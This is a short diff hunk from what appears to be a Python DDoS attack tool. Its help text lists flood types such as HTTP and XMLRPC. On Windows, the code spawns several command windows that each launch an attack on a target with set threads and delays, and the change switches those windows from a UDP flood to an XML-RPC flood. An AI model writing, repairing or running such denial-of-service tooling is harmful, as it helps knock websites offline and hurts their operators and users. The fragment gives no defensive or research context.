@@ -126,7 +126,7 @@ For using : -d (ddos_type) example : -d HTTP/SG or -d XMLRPC"""
                 error_msg("Please include path xmlrpc.php"); sys.exit(0)
             if args.summon != 0:
                 if os.name == 'nt':
-                    command = f"python -c \"from ddos.udp import Udp; send = Udp('{args.target}', {str(args.thread)}, {str(args.sleep)}); send.attack()\""
+                    command = f"python -c \"from ddos.xmlrpc import Xmlrpc; send = Xmlrpc('{args.target}', {str(args.thread)}, {str(args.sleep)}); send.attack()\""
                     for i in range(args.summon):
                         os.system(f"start cmd /K {command}")
                 else:
